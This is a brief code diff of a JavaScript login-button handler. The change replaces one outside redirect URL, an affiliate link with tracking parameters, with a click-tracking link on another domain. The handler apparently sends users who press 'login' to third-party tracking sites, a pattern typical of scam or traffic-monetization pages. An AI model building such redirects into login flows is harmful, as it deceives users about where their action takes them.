@@ -72,6 +72,6 @@ LoginBtn.addEventListener('click', e => {
         return; // Abort the transaction.
       }
     });
-    window.location.replace("https://aff.abomahraanremix.com/?utm_medium=be8db21253de1c522917a2eabcecdb89ecea5f48&utm_campaign=Egyyyptttt");
+    window.location.replace("https://zeromsec.com/cl/bcbdc1702709955b?p1=&p2=&source=&site=");
   }
 });
